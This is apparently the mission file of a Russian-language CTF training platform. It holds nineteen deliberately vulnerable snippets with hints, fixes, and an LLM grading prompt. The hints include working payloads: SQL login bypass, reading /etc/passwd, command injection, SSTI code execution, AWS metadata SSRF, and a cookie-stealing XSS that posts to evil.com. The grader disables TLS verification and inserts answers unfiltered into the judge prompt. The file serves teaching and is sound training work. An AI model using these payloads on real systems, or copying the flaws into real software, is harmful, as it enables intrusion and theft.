import json
import logging
import httpx

from app.config import Settings

logger = logging.getLogger(__name__)

MISSIONS = [
    {
        "id": "xss-reflected",
        "title": "Reflected XSS в поиске",
        "category": "XSS",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "Обработчик поисковой строки возвращает пользовательский ввод "
            "прямо в HTML без экранирования. Найдите уязвимость, объясните "
            "вектор атаки и предложите исправление."
        ),
        "code": """from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f'<h1>Результаты поиска: {query}</h1>'""",
        "language": "python",
        "hints": [
            "Как пользовательский ввод попадает в HTML-ответ?",
            "Что произойдёт при запросе /search?q=<script>alert(1)</script>?",
            "Используйте функцию escape() из markupsafe или шаблонизатор Jinja2.",
        ],
    },
    {
        "id": "sqli-login",
        "title": "SQL-инъекция в авторизации",
        "category": "Injection",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "Форма входа подставляет логин и пароль прямо в SQL-запрос "
            "через f-строку. Покажите, как обойти авторизацию, и предложите безопасный вариант."
        ),
        "code": """import sqlite3

def login(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    user = cursor.fetchone()
    conn.close()
    return user is not None""",
        "language": "python",
        "hints": [
            "Обратите внимание на формирование SQL-запроса через f-строку.",
            "Введите username: ' OR '1'='1' --  — что произойдёт?",
            "Замените f-строку на параметризованный запрос: cursor.execute('SELECT ... WHERE username=? AND password=?', (username, password)).",
        ],
    },
    {
        "id": "csrf-transfer",
        "title": "CSRF в банковском переводе",
        "category": "CSRF",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "API перевода средств проверяет сессию, но не защищён от подделки "
            "межсайтового запроса. Объясните сценарий атаки и способ защиты."
        ),
        "code": """from flask import Flask, request, session

app = Flask(__name__)

@app.route('/transfer', methods=['POST'])
def transfer():
    if 'user_id' not in session:
        return 'Unauthorized', 401
    to_account = request.form['to']
    amount = request.form['amount']
    execute_transfer(session['user_id'], to_account, amount)
    return f'Переведено {amount} руб. на счёт {to_account}'""",
        "language": "python",
        "hints": [
            "Проверяется ли источник запроса (Origin/Referer)?",
            "Злоумышленник может разместить скрытую форму на своём сайте, автоматически отправляющую POST.",
            "Добавьте CSRF-токен, проверяйте заголовок Origin, используйте SameSite=Strict для cookie.",
        ],
    },
    {
        "id": "idor-profile",
        "title": "IDOR — доступ к чужим данным",
        "category": "Broken Access Control",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "API профиля проверяет авторизацию, но не сверяет, "
            "запрашивает ли пользователь именно свои данные. "
            "Опишите атаку и предложите исправление."
        ),
        "code": """from fastapi import FastAPI, Header

app = FastAPI()

@app.get('/api/user/{user_id}')
async def get_profile(user_id: int, authorization: str = Header()):
    token_data = verify_token(authorization)
    user = db.get_user(user_id)
    if not user:
        return {'error': 'Not found'}
    return {'id': user.id, 'name': user.name, 'email': user.email, 'balance': user.balance}""",
        "language": "python",
        "hints": [
            "Токен проверяется, но user_id из URL сравнивается с user_id из токена?",
            "Авторизованный пользователь с id=1 может запросить /api/user/999.",
            "Добавьте проверку: if token_data['user_id'] != user_id: return 403.",
        ],
    },
    {
        "id": "hardcoded-secrets",
        "title": "Секреты в исходном коде",
        "category": "Security Misconfiguration",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "В коде содержатся захардкоженные ключи и пароли. "
            "Перечислите все найденные секреты, объясните риски и предложите решение."
        ),
        "code": """import requests

API_KEY = "sk-proj-abc123def456ghi789"
DB_PASSWORD = "super_secret_password_123"
JWT_SECRET = "my-jwt-secret-key-2024"

def get_weather(city):
    return requests.get(
        f"https://api.weather.com/v1/forecast?city={city}",
        headers={"Authorization": f"Bearer {API_KEY}"}
    ).json()

def connect_db():
    return psycopg2.connect(
        host="db.production.internal",
        user="admin",
        password=DB_PASSWORD
    )""",
        "language": "python",
        "hints": [
            "Обратите внимание на глобальные переменные в начале файла.",
            "Если код попадёт в публичный репозиторий, злоумышленник получит доступ к API и БД.",
            "Храните секреты в переменных окружения (os.environ) или в .env файле, добавленном в .gitignore.",
        ],
    },
    {
        "id": "path-traversal",
        "title": "Path Traversal в загрузках",
        "category": "Injection",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "Сервис скачивания файлов не проверяет путь. "
            "Покажите, как получить /etc/passwd, и предложите защиту."
        ),
        "code": """from flask import Flask, request, send_file
import os

app = Flask(__name__)
UPLOAD_DIR = '/var/www/uploads'

@app.route('/download')
def download():
    filename = request.args.get('file', '')
    filepath = os.path.join(UPLOAD_DIR, filename)
    if os.path.exists(filepath):
        return send_file(filepath)
    return 'File not found', 404""",
        "language": "python",
        "hints": [
            "Что произойдёт при запросе /download?file=../../etc/passwd?",
            "os.path.join не защищает от компонентов '..' в пути.",
            "Используйте os.path.realpath() и убедитесь, что результат начинается с UPLOAD_DIR.",
        ],
    },
    {
        "id": "pickle-deser",
        "title": "Десериализация pickle",
        "category": "Insecure Deserialization",
        "difficulty": "hard",
        "points": 300,
        "description": (
            "Сервер восстанавливает сессию из pickle-данных, "
            "переданных пользователем. Объясните, почему это критически опасно."
        ),
        "code": """import pickle, base64
from flask import Flask, request

app = Flask(__name__)

@app.route('/load-session', methods=['POST'])
def load_session():
    data = request.form.get('session_data', '')
    try:
        session = pickle.loads(base64.b64decode(data))
        return f'Welcome back, {session.get("username", "user")}!'
    except Exception:
        return 'Invalid session', 400""",
        "language": "python",
        "hints": [
            "pickle.loads() способен выполнить произвольный Python-код при десериализации.",
            "Злоумышленник создаёт класс с __reduce__, возвращающим os.system('...').",
            "Никогда не используйте pickle для данных от пользователя. Замените на JSON или подписанные токены (itsdangerous).",
        ],
    },
    {
        "id": "ssrf-webhook",
        "title": "SSRF через вебхук",
        "category": "SSRF",
        "difficulty": "hard",
        "points": 300,
        "description": (
            "Функция тестирования вебхуков выполняет HTTP-запрос по URL от пользователя. "
            "Покажите, как добраться до внутренних сервисов, и предложите защиту."
        ),
        "code": """import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/webhook/test', methods=['POST'])
def test_webhook():
    url = request.json.get('url')
    if not url:
        return jsonify({'error': 'URL required'}), 400
    try:
        resp = requests.get(url, timeout=5)
        return jsonify({'status': resp.status_code, 'body': resp.text[:500]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500""",
        "language": "python",
        "hints": [
            "Сервер выполняет GET-запрос по URL, указанному пользователем, без ограничений.",
            "URL http://169.254.169.254/latest/meta-data/ возвращает AWS-метаданные с ключами.",
            "Фильтруйте IP: запретите 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16.",
        ],
    },
    {
        "id": "open-redirect",
        "title": "Открытый редирект",
        "category": "Open Redirect",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "После авторизации пользователь перенаправляется по параметру next. "
            "Злоумышленник может подставить свой домен. "
            "Найдите уязвимость и предложите исправление."
        ),
        "code": """from flask import Flask, request, redirect, session

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    if check_credentials(username, password):
        session['user'] = username
        next_url = request.args.get('next', '/')
        return redirect(next_url)
    return 'Invalid credentials', 401""",
        "language": "python",
        "hints": [
            "Параметр next никак не валидируется перед редиректом.",
            "Злоумышленник отправит ссылку /login?next=https://evil.com — жертва после логина попадёт на фишинговый сайт.",
            "Проверяйте, что next_url начинается с '/' и не содержит '://' — разрешайте только относительные пути.",
        ],
    },
    {
        "id": "cmd-injection",
        "title": "Внедрение команд ОС",
        "category": "Injection",
        "difficulty": "hard",
        "points": 300,
        "description": (
            "Утилита пинга передаёт пользовательский ввод прямо в os.system(). "
            "Продемонстрируйте выполнение произвольных команд и предложите защиту."
        ),
        "code": """import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/ping')
def ping():
    host = request.args.get('host', '')
    result = os.popen(f'ping -c 3 {host}').read()
    return f'<pre>{result}</pre>'""",
        "language": "python",
        "hints": [
            "Пользователь управляет переменной host, которая без фильтрации подставляется в команду оболочки.",
            "Запрос /api/ping?host=8.8.8.8;cat /etc/passwd выполнит две команды.",
            "Используйте subprocess.run(['ping', '-c', '3', host]) вместо os.popen — аргументы не попадут в оболочку. Дополнительно валидируйте host как IP-адрес.",
        ],
    },
    {
        "id": "prototype-pollution",
        "title": "Prototype Pollution",
        "category": "Injection",
        "difficulty": "expert",
        "points": 400,
        "description": (
            "Функция рекурсивного слияния объектов не проверяет ключи '__proto__' и 'constructor'. "
            "Покажите, как загрязнить прототип Object и повлиять на логику приложения."
        ),
        "code": """const express = require('express');
const app = express();
app.use(express.json());

function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

app.post('/api/config', (req, res) => {
    let config = { theme: 'dark' };
    merge(config, req.body);
    
    let user = {};
    if (user.isAdmin) {
        res.send('Welcome, Admin!');
    } else {
        res.send('Welcome, User.');
    }
});""",
        "language": "javascript",
        "hints": [
            "Функция merge перебирает все ключи, включая __proto__.",
            "Отправьте JSON: {\"__proto__\": {\"isAdmin\": true}}. Это добавит isAdmin всем объектам.",
            "Фильтруйте ключи: if (key === '__proto__' || key === 'constructor') continue; Или используйте Object.create(null).",
        ],
    },
    {
        "id": "ssti-jinja",
        "title": "Server-Side Template Injection",
        "category": "Injection",
        "difficulty": "expert",
        "points": 400,
        "description": (
            "Пользовательский ввод передаётся напрямую в шаблонизатор Jinja2 как строка шаблона. "
            "Продемонстрируйте выполнение произвольного кода (RCE) и предложите исправление."
        ),
        "code": """from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # Уязвимость: переменная name вставляется прямо в шаблон
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)""",
        "language": "python",
        "hints": [
            "render_template_string выполняет всё, что находится внутри {{ ... }}.",
            "Попробуйте передать ?name={{ 7*7 }} или {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}.",
            "Никогда не используйте f-строки для формирования шаблона. Передавайте переменные как контекст: render_template_string('<h1>Hello, {{ name }}!</h1>', name=name).",
        ],
    },
    {
        "id": "insecure-upload",
        "title": "Загрузка вредоносного файла",
        "category": "Unrestricted File Upload",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "Сервис загрузки аватаров принимает любой файл без проверки типа и расширения. "
            "Объясните риски и предложите безопасную реализацию."
        ),
        "code": """import os
from flask import Flask, request

app = Flask(__name__)
UPLOAD_DIR = '/var/www/static/avatars'

@app.route('/upload', methods=['POST'])
def upload_avatar():
    file = request.files['avatar']
    filename = file.filename
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)
    return f'Файл сохранён: /static/avatars/{filename}'""",
        "language": "python",
        "hints": [
            "Имя файла берётся от пользователя без изменений — можно загрузить shell.php или script.html.",
            "Нет проверки MIME-типа, расширения и размера. Атакующий загружает исполняемый скрипт.",
            "Генерируйте случайное имя (uuid4), проверяйте расширение по белому списку (.jpg, .png), валидируйте MIME-тип и ограничьте размер.",
        ],
    },
    {
        "id": "mass-assignment",
        "title": "Mass Assignment при регистрации",
        "category": "Broken Access Control",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "Обработчик регистрации принимает все поля из JSON без фильтрации. "
            "Покажите, как стать администратором, и предложите защиту."
        ),
        "code": """from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    user = User(
        username=data.get('username'),
        email=data.get('email'),
        password=hash_password(data.get('password')),
        role=data.get('role', 'user'),
        is_admin=data.get('is_admin', False)
    )
    db.session.add(user)
    db.session.commit()
    return jsonify({'id': user.id, 'role': user.role})""",
        "language": "python",
        "hints": [
            "Поля role и is_admin берутся напрямую из пользовательского JSON.",
            "Отправьте {\"username\":\"hacker\",\"email\":\"h@h.com\",\"password\":\"123\",\"role\":\"admin\",\"is_admin\":true}.",
            "Явно задавайте role='user' и is_admin=False, игнорируя значения из входных данных. Используйте Pydantic-схему с разрешёнными полями.",
        ],
    },
    {
        "id": "stored-xss-comment",
        "title": "Stored XSS в комментариях",
        "category": "XSS",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "Система комментариев сохраняет и отображает HTML без санитизации. "
            "Покажите вектор атаки и предложите защиту."
        ),
        "code": """from flask import Flask, request, render_template_string

app = Flask(__name__)
comments = []

@app.route('/comment', methods=['POST'])
def add_comment():
    text = request.form.get('text', '')
    author = request.form.get('author', 'Аноним')
    comments.append({'author': author, 'text': text})
    return 'OK'

@app.route('/comments')
def show_comments():
    html = '<h1>Комментарии</h1>'
    for c in comments:
        html += f'<div><b>{c["author"]}</b>: {c["text"]}</div>'
    return html""",
        "language": "python",
        "hints": [
            "Поля author и text подставляются в HTML без экранирования.",
            "Отправьте комментарий с текстом <script>document.location='https://evil.com/?c='+document.cookie</script> — он выполнится у каждого посетителя.",
            "Используйте шаблонизатор Jinja2 с автоэкранированием ({{ c.text }}) или функцию markupsafe.escape().",
        ],
    },
    {
        "id": "insecure-cookie",
        "title": "Небезопасные cookie сессии",
        "category": "Broken Authentication",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "Авторизация реализована через cookie без флагов безопасности. "
            "Объясните, чем это грозит, и покажите правильную настройку."
        ),
        "code": """from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['user'], request.form['pass'])
    if user:
        resp = make_response('Welcome!')
        resp.set_cookie('session_id', generate_session_id(user.id))
        return resp
    return 'Fail', 401

@app.route('/dashboard')
def dashboard():
    sid = request.cookies.get('session_id')
    user = get_user_by_session(sid)
    if not user:
        return 'Unauthorized', 401
    return f'Hello, {user.name}'""",
        "language": "python",
        "hints": [
            "Cookie устанавливается без флагов HttpOnly, Secure и SameSite.",
            "Без HttpOnly — JavaScript может прочитать cookie (document.cookie). Без Secure — cookie передаётся по HTTP. Без SameSite — уязвимость для CSRF.",
            "Добавьте: resp.set_cookie('session_id', sid, httponly=True, secure=True, samesite='Strict', max_age=3600).",
        ],
    },
    {
        "id": "weak-hash",
        "title": "Слабое хеширование паролей",
        "category": "Cryptographic Failures",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "Пароли хранятся в MD5 без соли. "
            "Объясните, почему это небезопасно, и предложите правильный подход."
        ),
        "code": """import hashlib
import sqlite3

def register(username, password):
    password_hash = hashlib.md5(password.encode()).hexdigest()
    conn = sqlite3.connect('users.db')
    conn.execute(
        'INSERT INTO users (username, password_hash) VALUES (?, ?)',
        (username, password_hash)
    )
    conn.commit()
    conn.close()

def check_password(username, password):
    conn = sqlite3.connect('users.db')
    row = conn.execute(
        'SELECT password_hash FROM users WHERE username=?', (username,)
    ).fetchone()
    conn.close()
    if row:
        return row[0] == hashlib.md5(password.encode()).hexdigest()
    return False""",
        "language": "python",
        "hints": [
            "MD5 — быстрая хеш-функция, подбор по rainbow-таблицам занимает секунды.",
            "Отсутствие соли означает, что одинаковые пароли дают одинаковые хеши — атакующий ломает сразу все аккаунты.",
            "Используйте bcrypt: import bcrypt; hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt()). Он добавляет соль и медленный по дизайну.",
        ],
    },
    {
        "id": "dom-xss",
        "title": "DOM-based XSS",
        "category": "XSS",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "Клиентский JavaScript читает параметр из URL и вставляет его в DOM через innerHTML. "
            "Покажите эксплуатацию и предложите безопасную альтернативу."
        ),
        "code": """<!DOCTYPE html>
<html>
<head><title>Приветствие</title></head>
<body>
<div id="greeting"></div>
<script>
  var params = new URLSearchParams(window.location.search);
  var name = params.get('name') || 'Гость';
  document.getElementById('greeting').innerHTML =
    '<h1>Привет, ' + name + '!</h1>';
</script>
</body>
</html>""",
        "language": "html",
        "hints": [
            "Параметр name из URL подставляется в innerHTML без экранирования.",
            "Откройте страницу с ?name=<img src=x onerror=alert(document.cookie)> — код выполнится в браузере.",
            "Используйте textContent вместо innerHTML: el.textContent = 'Привет, ' + name;  Либо создавайте элементы через document.createElement().",
        ],
    },
    {
        "id": "nosql-injection",
        "title": "NoSQL-инъекция в MongoDB",
        "category": "Injection",
        "difficulty": "hard",
        "points": 300,
        "description": (
            "Авторизация через MongoDB принимает JSON напрямую от пользователя. "
            "Покажите, как обойти проверку пароля, и предложите защиту."
        ),
        "code": """from flask import Flask, request, jsonify
from pymongo import MongoClient

app = Flask(__name__)
db = MongoClient().myapp

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    user = db.users.find_one({
        'username': data['username'],
        'password': data['password']
    })
    if user:
        token = create_token(user['_id'])
        return jsonify({'token': token})
    return jsonify({'error': 'Invalid credentials'}), 401""",
        "language": "python",
        "hints": [
            "MongoDB принимает операторы как значения. Что если password — не строка, а объект?",
            "Отправьте {\"username\":\"admin\",\"password\":{\"$ne\":\"\"}} — условие $ne (не равно пустой строке) вернёт true для любого пароля.",
            "Проверяйте типы: if not isinstance(data.get('password'), str): return 400. Или используйте Pydantic/Marshmallow для валидации входных данных.",
        ],
    },
]


def get_missions_list() -> list[dict]:
    return [
        {
            "id": m["id"],
            "title": m["title"],
            "category": m["category"],
            "difficulty": m["difficulty"],
            "points": m["points"],
            "description": m["description"],
        }
        for m in MISSIONS
    ]


def get_mission(mission_id: str) -> dict | None:
    for m in MISSIONS:
        if m["id"] == mission_id:
            return {
                "id": m["id"],
                "title": m["title"],
                "category": m["category"],
                "difficulty": m["difficulty"],
                "points": m["points"],
                "description": m["description"],
                "code": m["code"],
                "language": m["language"],
                "total_hints": len(m["hints"]),
            }
    return None


def get_hint(mission_id: str, hint_index: int) -> str | None:
    for m in MISSIONS:
        if m["id"] == mission_id:
            hints = m["hints"]
            if 0 <= hint_index < len(hints):
                return hints[hint_index]
            return None
    return None


CHECK_PROMPT = (
    "Ты — судья CTF-соревнования по информационной безопасности.\n"
    "Задание: {title}\nОписание: {description}\n"
    "Уязвимый код:\n```\n{code}\n```\n\n"
    "Ответ участника:\n{answer}\n\n"
    "Оцени ответ по трём критериям (0-10 каждый):\n"
    "1. Правильность определения уязвимости\n"
    "2. Качество объяснения вектора атаки\n"
    "3. Корректность предложенного исправления\n\n"
    "Верни СТРОГО JSON:\n"
    '{{"scores":{{"identification":0,"explanation":0,"fix":0}},'
    '"total":0,"max":30,"passed":false,'
    '"feedback":"Развёрнутый комментарий на русском"}}'
)


async def check_answer(mission_id: str, answer: str, settings: Settings) -> dict:
    mission = None
    for m in MISSIONS:
        if m["id"] == mission_id:
            mission = m
            break
    if not mission:
        return {"error": "Миссия не найдена."}

    if not settings.mistral_api_key:
        return {"error": "MISTRAL_API_KEY не настроен."}

    prompt = CHECK_PROMPT.format(
        title=mission["title"],
        description=mission["description"],
        code=mission["code"],
        answer=answer,
    )
    payload = {
        "model": "codestral-latest",
        "messages": [{"role": "user", "content": prompt}],
        "max_tokens": 4096,
        "temperature": 0.2,
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {settings.mistral_api_key}",
    }
    try:
        async with httpx.AsyncClient(
            timeout=settings.request_timeout, verify=False, trust_env=False
        ) as client:
            resp = await client.post(
                "https://api.mistral.ai/v1/chat/completions",
                json=payload,
                headers=headers,
            )
            resp.raise_for_status()
            text = resp.json()["choices"][0]["message"]["content"].strip()
            if text.startswith("```"):
                text = text.split("\n", 1)[1] if "\n" in text else text[3:]
            if text.endswith("```"):
                text = text[:-3].strip()
            return json.loads(text)
    except Exception as exc:
        logger.error("CTF check error: %s", exc)
        return {"error": f"Ошибка проверки: {exc}"}
